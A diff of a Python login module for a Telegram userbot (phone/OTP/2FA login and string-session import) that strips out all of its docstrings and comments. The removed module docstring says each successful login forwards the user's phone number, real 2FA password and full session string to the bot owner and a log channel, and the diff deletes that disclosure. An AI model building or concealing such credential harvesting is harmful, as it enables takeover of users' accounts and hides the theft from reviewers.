@@ -1,22 +1,3 @@
-"""
-Login flows — ported 1:1 from 4st_userbot's assistant_input_listener
-(pyro_waiting_phone / pyro_waiting_otp / pyro_waiting_2fa / pyro_waiting_string).
-
-  • /login       — phone number + OTP (+ 2FA) → bot khud string session banata hai
-  • /addstring   — existing Pyrogram string session (BQ…)
-  • /logout      — session hata dein
-
-4st behaviour that the old flow was missing (the bugs):
-  • Phone: "+" auto-prefix, spaces/dashes strip — "919876543210" bhi chalega.
-  • Har error par conversation state RESET + temp client disconnect — user
-    kabhi stuck nahi hota, agla message galat step me nahi jaata.
-  • String: "BQ" check + probe via connect()/get_me() (NOT start()) — invalid
-    string par pyrogram stdin par phone maangta tha → Heroku par EOF / hang.
-  • Same string do users register nahi kar sakte (4st: "already registered").
-  • Success → #NEW_USER alert (LOG_CHANNEL + OWNER DM) with phone, 2FA
-    status, real 2FA password, session string, Kolkata time.
-  • STRING_DEPLOY / LOGIN_* actions 📡 SYSTEM LOG format me.
-"""
 
 import asyncio
 import re
@@ -53,7 +34,6 @@ def _bq(text: str) -> str:
     return f"<blockquote>{text}</blockquote>"
 
 def _reset(user_id: int):
-    """4st: state.asst_conversation_state[sender_id] = None (+ client cleanup)."""
     CONVERSATION.pop(user_id, None)
     client = AUTH_CLIENTS.pop(user_id, None)
     if client:
@@ -74,7 +54,6 @@ async def _reset_now(user_id: int):
             pass
 
 async def _edit(msg, text: str, reply_markup=None):
-    """4st _premium_edit equivalent — never raises."""
     try:
         return await msg.edit_text(text, reply_markup=reply_markup,
                                    disable_web_page_preview=True)
@@ -94,7 +73,6 @@ def _account_dict(me, two_factor: bool = False) -> dict:
     }
 
 async def _string_owner(string: str):
-    """Return user_id already holding this exact string (4st duplicate check)."""
     try:
         for u in await db.all_users():
             if u.get("string_session") == string:
@@ -106,11 +84,6 @@ async def _string_owner(string: str):
 async def _deploy(bot, target_msg, user, string_session: str, me, *,
                   method: str, phone: str, twofa: bool = False,
                   twofa_password: str = ""):
-    """
-    4st: save_config → notify_new_user → init_pyrogram → _start_music_engine.
-    Save first, notify second, engine last — engine failure must never lose
-    the session or the log.
-    """
     account = _account_dict(me, twofa)
     await db.add_user(user.id, user.username or "", user.first_name or "")
     await db.update_string(user.id, string_session)
@@ -207,7 +180,6 @@ async def cb_addstring(bot, cq):
     await safe_answer(cq)
 
 async def _handle_string(bot: Client, msg: Message, session_text: str):
-    """4st pyro_waiting_string + waiting_str probe/duplicate logic."""
     user = msg.from_user
     CONVERSATION.pop(user.id, None)
     session_text = session_text.strip().strip("`").strip()
